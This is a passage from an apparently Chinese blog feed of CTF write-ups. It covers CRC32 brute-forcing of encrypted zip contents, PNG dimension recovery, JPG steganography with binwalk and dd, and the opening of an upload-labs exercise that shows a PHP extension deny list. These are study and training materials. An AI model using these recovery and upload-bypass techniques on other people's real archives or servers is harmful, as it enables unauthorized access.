class="keyword">in</span> z.infolist():</span><br><span class="line"><span class="keyword">print</span> i.file_size, i.header_offset</span><br></pre></td></tr></table></figure><p>　　这里使用了z.infolist(), 它返回的就是压缩包内所有文件的信息，就是一个ZipInfo的列表。一个ZipInfo对象中包含了压缩包内一个文件的信息，其中比较常用的是 filename, file_size, header_offset, 分别为文件名，文件大小，文件数据在压缩包中的偏移。其实之前的z.namelist()就是读取的ZipInfo中的filename，组成一个 list返回的。<br><strong>例子2：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile  </span><br><span class="line">z = zipfile.ZipFile(<span class="string">'C:/Users/12521/Desktop/123.zip'</span>, <span class="string">'r'</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> z.infolist():  </span><br><span class="line"><span class="keyword">print</span> (i.filename,i.file_size, i.header_offset,<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/94.png" alt="754225775624f6d0539d9242396ac0f6.png"><br>3.从压缩包里解压缩出一个文件的方法是使用ZipFile的read方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">z = zipfile.ZipFile(filename, &apos;r&apos;)</span><br><span class="line">print z.read(z.namelist()[0])</span><br></pre></td></tr></table></figure><p><strong>例子3：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">filename=<span class="string">"C:/Users/12521/Desktop/3.zip"</span></span><br><span class="line">z=zipfile.ZipFile(filename,<span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">print</span> (z.read(z.namelist()[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><p><img src="/images/95.png" alt="d08ec3779353070cb9142d52dae3191b.png"><br>4.Zipinfo类的基本操作<br>ZipFile.getinfo(name)<br>获取zip文档内指定文件的信息。返回一个zipfile.ZipInfo对象，它包括文件的详细信息。<br>ZipFile.infolist()<br>获取zip文档内所有文件的信息，返回一个zipfile.ZipInfo的列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">filename=<span class="string">"C:/Users/12521/Desktop/3.zip"</span></span><br><span class="line">z=zipfile.ZipFile(filename,<span class="string">'r'</span>)</span><br><span class="line">a=z.getinfo(<span class="string">"题目.txt"</span>)  <span class="comment">#getinfo的对象必须是打开的文件</span></span><br><span class="line">print(hex(a.CRC))</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p><img src="/images/96.png" alt="32cd28912941ebd4fcfe33c04b34628b.png"></p><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                        <span class="keyword">print</span> s</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> I <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">'./out'</span> + str(I) + <span class="string">'.zip'</span></span><br><span class="line">        f = zipfile.ZipFile(file, <span class="string">'r'</span>)</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        <span class="comment">#以上3行为获取压缩包CRC32值的步骤</span></span><br><span class="line">        <span class="keyword">print</span> hex(crc)</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"> </span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">'+/='</span></span><br><span class="line"> </span><br><span class="line">f = open(<span class="string">'./out.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python之zipfile模块&lt;/p&gt;
    
    </summary>
    
      <category term="PYTHON" scheme="http://yoursite.com/categories/PYTHON/"/>
    
      <category term="模块实例解析" scheme="http://yoursite.com/categories/PYTHON/%E6%A8%A1%E5%9D%97%E5%AE%9E%E4%BE%8B%E8%A7%A3%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>BUGKU--好多压缩包</title>
    <link href="http://yoursite.com/2019/08/14/BUGKU-%E5%A5%BD%E5%A4%9A%E5%8E%8B%E7%BC%A9%E5%8C%85/"/>
    <id>http://yoursite.com/2019/08/14/BUGKU-好多压缩包/</id>
    <published>2019-08-14T08:06:07.000Z</published>
    <updated>2019-08-14T08:12:33.988Z</updated>
    
    <content type="html"><![CDATA[<p>下载文件，解压后是68个压缩文件，而且每个文件都是加密的，也没有提示密码，爆破？胡扯，这么多，还不想耗死。</p><a id="more"></a><p>正确思路CRC32碰撞，介绍一下CRC32碰撞：</p><pre><code>CRC32:CRC本身是“冗余校验码”的意思，CRC32则表示会产生一个32bit（8位十六进制数）的校验值。在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件的内容</code></pre><p>爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                        <span class="comment">#print s</span></span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> I <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">'out'</span> + str(I) + <span class="string">'.zip'</span></span><br><span class="line">        f = zipfile.ZipFile(file, <span class="string">'r'</span>)</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        <span class="comment">#以上3行为获取压缩包CRC32值的步骤</span></span><br><span class="line">        <span class="comment">#print hex(crc)</span></span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"> </span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">'+/='</span></span><br><span class="line"> </span><br><span class="line">f = open(<span class="string">'out.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>脚本总结：<br>1.为什么crc是四个？<br>我们使用winrar压缩包可以查看到压缩包里面的文件大小。(winrar看到的是字节，12345好压看到的是kb)<br>在记事本里面，一个汉字和中文的标点符号两个字节，一个英文字母和英文的标点符号占一个字节。<br>我们猜测是英文字符啊，毕竟中文字符的话有几万个，你要是用中文字符的话和爆破有什么区别呢？所以一个txt里面是四个字符。<br>2.<br>dic，它表示的是字符的范围。其实更保险的话应该是用string.printable,<br>虽然printable更保险，但是时间会更长，毕竟爆破的字符数更多了。这里解出来之后发现是一段base64字符串，也就没有什么区别了，因为base64范围：0-9 A-Z a-z + / = 这64个字符string.ascii_letters + string.digits + ‘+/=’已经完全给包含了，看来还是经验啊，大佬们可能一眼就看穿了这是个base64字符串。<br>base64密文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==</span><br></pre></td></tr></table></figure><p>关于这个base64，我拿到一般的工具下面解压发现解压的内容是乱码，粘贴复制都不太好使毕竟涉及到格式、编码字符问题，所以干脆我就直接上代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f=open(<span class="string">'./out.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">a=f.read()</span><br><span class="line">text=base64.b64decode(a)</span><br><span class="line">f1=open(<span class="string">'./out.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">f1.write(str(text))</span><br><span class="line">f.close()</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure><p>但是解码出来的东西放到winhex中总比别人多一个字节。所以我有换了另一种方式：<br>直接拿到notepad++使用自带的base64解码，然后放到winhex中。<br><img src="/images/91.png" alt="6bb8133621d5fa828d163b960fa53c8a.png"><br><img src="/images/92.png" alt="0c0277c97b097d56c8d07f4a2782dc65.png"><br>文件尾部是rar的文件尾部，所以补充rar头部：<br>526172211A0700，最后在注释中拿到了flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;下载文件，解压后是68个压缩文件，而且每个文件都是加密的，也没有提示密码，爆破？胡扯，这么多，还不想耗死。&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
      <category term="杂项" scheme="http://yoursite.com/categories/CTF/%E6%9D%82%E9%A1%B9/"/>
    
      <category term="修改高度和宽度" scheme="http://yoursite.com/categories/CTF/%E6%9D%82%E9%A1%B9/%E4%BF%AE%E6%94%B9%E9%AB%98%E5%BA%A6%E5%92%8C%E5%AE%BD%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>攻防世界-2-1</title>
    <link href="http://yoursite.com/2019/08/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-2-1/"/>
    <id>http://yoursite.com/2019/08/14/攻防世界-2-1/</id>
    <published>2019-08-14T07:02:23.000Z</published>
    <updated>2019-08-14T07:11:28.629Z</updated>
    
    <content type="html"><![CDATA[<p>python之crc爆破</p><a id="more"></a><h4 id="python脚本之CRC爆破宽度和长度："><a href="#python脚本之CRC爆破宽度和长度：" class="headerlink" title="python脚本之CRC爆破宽度和长度："></a><strong>python脚本之CRC爆破宽度和长度：</strong></h4><p><strong>基础知识</strong><br>先详细解释一下png的文件头：</p><ul><li>（固定）八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头</li><li>（固定）四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13</li><li>（固定）四个字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示（IDCH）</li><li>（可变）13位数据块（IHDR)<ul><li>前四个字节代表该图片的宽</li><li>后四个字节代表该图片的高</li><li>后五个字节依次为：<br>Bit depth、ColorType、Compression method、Filter method、Interlace method</li></ul></li><li>（可变）剩余四字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行crc计算得到。<br>也就是说我们可以通过爆破来得到高度和宽度</li></ul><p><strong>理论依据</strong><br>png的CRC检验码，由从IDCH到IHDR的十七位字节进行crc计算得到。我们上图来解释一下：<br><img src="/images/81.png" alt="ac75291c5c164369c32efa3012cc0a09.png"><br>绿色的部分就是IHDR(代表图片的长和宽)+后五个字节一共是13个字节。黄色的部分就是图片的CRC值一共是四个字节。所以加起来就是十七个字节。<br><strong>目的：</strong><br>写python脚本以至于爆破出已知的的CRC对应的图片宽度或者高度。<br><strong>脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line">m = open(<span class="string">"misc4.png"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">    c = m[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">'&gt;i'</span>, i) + m[<span class="number">20</span>:<span class="number">29</span>]</span><br><span class="line">    crc = binascii.crc32(c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc == <span class="number">0x932f8a6b</span>:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line">m = open(<span class="string">"1.png"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">65535</span>):</span><br><span class="line">    c = m[<span class="number">12</span>:<span class="number">20</span>] + struct.pack(<span class="string">'&gt;i'</span>, i) + m[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc = binascii.crc32(c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc == <span class="number">0x6F03AD71</span>:</span><br><span class="line">        print(hex(i))</span><br></pre></td></tr></table></figure><p><strong>脚本分析：</strong><br>1.open()<br>打开一张图片，rb是指以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。<br>.read([size])：size 未指定则返回整个文件，如果文件大小 &gt;2 倍内存则有问题，f.read()读到文件尾时返回””(空字串)。也就是读取图片的意思，<br>2.struct.pack(‘&gt;i’, i)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">struct — Interpret bytes as packed binary data</span><br><span class="line"></span><br><span class="line">将字节解释为压缩二进制数据</span><br><span class="line"></span><br><span class="line">struct.pack(format, v1, v2, ...)</span><br><span class="line"></span><br><span class="line">Return a bytes object containing the values v1, v2, … packed according to the format string format. The arguments must match the values required by the format exactly.</span><br><span class="line"></span><br><span class="line">返回一个字节对象，该对象包含根据格式字符串格式打包的值v1、v2，…。参数必须与格式要求的值完全匹配。</span><br><span class="line"></span><br><span class="line">第一个参数是后面所有参数的格式字符串，后面的每个参数必须与格式字符串描述一致。</span><br><span class="line"></span><br><span class="line">eg:h表示short，l表示long； &apos;hhl&apos;表示后面有三个参数，依次是short，short，long类型</span><br><span class="line"></span><br><span class="line"> c表示 char，bytes of length 1（长度的byte数组），i表示integer 整数；&apos;ci&apos;表示后面有两个个参数，依次是char，integer 类型</span><br></pre></td></tr></table></figure><p>struct的pack函数把任意数据类型变成字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">struct.pack(<span class="string">'&gt;I'</span>, <span class="number">10240099</span>)</span><br><span class="line"><span class="string">'\x00\x9c@c'</span></span><br></pre></td></tr></table></figure><p>‘pack的第一个参数是处理指令，’&gt;I’的意思是：&gt;表示字节顺序是big-endian，也就是网络序，I表示4字节无符号整数(四个字节正好对应winhex中的高或者宽)。<br>说白了就是进行一个数据转换问题。<br>因为我们在for i in range中的i是一个整数，但是我们需要与winhex中的数据 进行拼接，所以理所应当的进行数据转化。<br>4.crc = binascii.crc32(c) &amp; 0xffffffff<br>这句话就是将c的值利用binascii模块的crc方法转化为crc，<strong>关于后面的0xffffff</strong>：</p><p>在 Python 2.x 的版本中，binascii.crc32 所计算出來的 CRC 值域为[-2^31, 2^31-1] 之间的有符号整数，为了要与一般CRC 结果作比对，需要将其转为无符号整数，所以加上&amp; 0xffffffff来进行转换。如果是 Python 3.x 的版本，其计算结果为 [0, 2^32-1] 间的无符号整数，因此不需额外加上&amp; 0xffffffff 。<br>5.c = m[12:16] + struct.pack(‘&gt;i’, i) + m[20:29]<br>这句话理解比较好理解但是我在m[12:16]这里比较疑惑，就是说到底包不包含第12或者第16?<br><img src="/images/82.png" alt="d89f0c4d8ebe649b6f8b4630ddddb2be.png"><br>因此我们可以看到python中是从0开始的而且不包括后面的数组类似开区间和闭区间。<br><img src="/images/83.png" alt="2e5a4ad45a5ae05f066bf924a9ed918a.png"><br>m[12:16]：第一行的49到第二行的00(但是不包括)<br>m[20:29]：第二行的第五个00到第二行的93(不包括)，93恰好是crc值的第一个值。<br>所以中间的就是我们要爆破出来的宽度。(宽度是四个字节我们在这里只是把十进制数变成了十六进制)</p><ol start="5"><li>os模块<br>在自动化测试中，经常需要查找操作文件，比如说查找配置文件（从而读取配置文件的信息），查找测试报告（从而发送测试报告邮件），经常要对大量文件和大量路径进行操作，这就依赖于os模块。</li></ol><hr><p>最终结果：<br><img src="/images/84.png" alt="95886dd13910b6b7952831561a05ea85.png"><br>最后我加一个print(hex(i))，毕竟还要在winhex中修改哎<br>ps：<br>这道题的思路就是注意图片属性可能找不到高度和宽度信息，而且winhex中的宽度和高度数据不正常。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python之crc爆破&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
      <category term="杂项" scheme="http://yoursite.com/categories/CTF/%E6%9D%82%E9%A1%B9/"/>
    
      <category term="修改高度和宽度" scheme="http://yoursite.com/categories/CTF/%E6%9D%82%E9%A1%B9/%E4%BF%AE%E6%94%B9%E9%AB%98%E5%BA%A6%E5%92%8C%E5%AE%BD%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>BUGKU-论剑</title>
    <link href="http://yoursite.com/2019/08/14/BUGKU-%E8%AE%BA%E5%89%91/"/>
    <id>http://yoursite.com/2019/08/14/BUGKU-论剑/</id>
    <published>2019-08-14T06:40:13.000Z</published>
    <updated>2019-08-14T07:04:43.020Z</updated>
    
    <content type="html"><![CDATA[<p>一开始以为这道题是一道简单的小杂项，后来里面设计到许多的知识点。</p><a id="more"></a><p>这是一个jpg图片，以前知道如何修改png的高和宽，换做是jpg竟然不知道了，网上说是先寻找FF2C。3字节后即图片的高与宽信息：<br><img src="/images/72.png" alt="1933f00ede1009f3cf5e209872fbc857.png"><br>什么是字节？几个数是一个字节？既然判断不出来那个数表示高和宽？我们可以讲图片的高和宽的十进制转化为十六进制。在python中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">g=<span class="number">66</span></span><br><span class="line">h=hex(g)</span><br><span class="line">print(h)</span><br><span class="line">s=<span class="number">781</span></span><br><span class="line">d=hex(<span class="number">781</span>)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><p><img src="/images/73.png" alt="0d66f18458dcce9d92340606f63caa45.png"><br>然后我们在winhex中搜索：<br>我一开始搜索0x30d，然后我就在winhex中输入30d但是找不到，后来发现原来是winhex中的每个十六进制是四位数，不足四位数去掉0x补0。即0x30d为030d。0x42即0042。我们在winhex中查看一下：<br><img src="/images/74.png" alt="74c57c0c344c1a813861822cf0fb0da9.png"><br>FFC2之后的三个字节后的八个字节就是高和宽。因此在winhex中两个数即位一个字节。因此我们修改宽和高。最终得到的图片为：<br><img src="/images/75.png" alt="81109af701bb742f8b8a2f851d358a55.png"><br>发现图片被挡住了，我们在查看一下分离出来的呢张图片：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">g=<span class="string">'0110110101111001011011100110000101101101011001010110100101110011011010110110010101111001001000010010000100100001011010000110100001101000'</span></span><br><span class="line">b=<span class="string">''</span></span><br><span class="line">e=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(g)):</span><br><span class="line">e+=<span class="number">1</span></span><br><span class="line">print(e)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">136</span>,<span class="number">8</span>):</span><br><span class="line">b+=chr(int(g[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><p><img src="/images/76.png" alt="77c0cb4781a5635f60bc92d938169587.png"><br>其实在一开始我是没有发现这些二进制数值的，毕竟文本太多了所以在以后要涨记性了。关于搜索文本我们在winhex中使用一下方法，我们使用同步搜搜一或者零：<br><img src="/images/77.png" alt="76835d3d40101b257aaefb9dc456f879.png"><br><img src="/images/78.png" alt="cdfbb4b9b89afa045f8105cd0159e8e3.png"><br>我们查到16进制之发现在十六进制后面有一个8对应38(这里要注意右侧文本中一个字母对应左侧两个数字注意是数字)，8之后是38 7B BC AF 27 1C 而7z的压缩包文件头为37 7A BC AF 27 1C。所以我们在这里修改一下(这里为什么说是从38开始修改呢？因为8之前是二进制我们总不能把二进制数据修改了吧)：<br><img src="/images/79.png" alt="d4c096615ff1c7b1670136527b8ff8c4.png"><br>保存好之后，我们在kali中使用binwalk。一开始我们是使用：<br><code>root@kali:~# binwalk &#39;/root/桌面/lunjian.jpg&#39; -e</code><br>我们看到只是显示出来包含文件：<br><img src="/images/80.png" alt="224928391de37e791b2dc245b6f786e1.png"><br>所以我们使用dd命令(这个命令我从来没使用过。。。0)<br><code>root@kali:~# dd if=&#39;/root/桌面/lunjian.jpg&#39;  of=8.zip  bs=1 skip=9591</code><br>一开始是bs=2，后来我该了为1就好使了。。。emmmmmmm不知道为啥。<br>之后我们打开压缩包有一个图片修改长度也是一个模糊的flag，与之前的比较得到flag。<br><code>flag{666c61677B6D795F6E616D655F482121487D}}</code>注意前面提醒了是not flagemmmmmmmm。最后我们解密：<br>flag{my_name_H!!H}</p><hr><p>这里讲一下base64、base32、base16<br>Base64：</p><p>包含大写字母（A-Z）,小写字母（a-z），数字（0-9）以及+/;<br>Base32:</p><p>而Base32中只有大写字母（A-Z）和数字234567；<br>Base16:</p><p>而Base16就是16进制，他的范围是数字(0-9)，字母（ABCDEF）；</p><p>顺便说一句，当ASCll用Base加密达不到所对应的位数的时候用=号补齐；</p><p>在这里附带由三种Base加密的:I love you！</p><p>Base64:SSBsb3ZlIHlvde+8gQ==</p><p>Base32:JEQGY33WMUQHS33V566IC===</p><p>Base16:49206c6f766520796f75efbc81</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一开始以为这道题是一道简单的小杂项，后来里面设计到许多的知识点。&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
      <category term="杂项" scheme="http://yoursite.com/categories/CTF/%E6%9D%82%E9%A1%B9/"/>
    
      <category term="修改高度和宽度" scheme="http://yoursite.com/categories/CTF/%E6%9D%82%E9%A1%B9/%E4%BF%AE%E6%94%B9%E9%AB%98%E5%BA%A6%E5%92%8C%E5%AE%BD%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>upload-labs-二</title>
    <link href="http://yoursite.com/2019/08/06/upload-labs-%E4%BA%8C/"/>
    <id>http://yoursite.com/2019/08/06/upload-labs-二/</id>
    <published>2019-08-06T13:30:53.000Z</published>
    <updated>2019-08-14T06:30:29.447Z</updated>
    
    <content type="html"><![CDATA[<p>我们进行文件上传第二阶段。</p><a id="more"></a><h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a><strong>第四关</strong></h4><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span 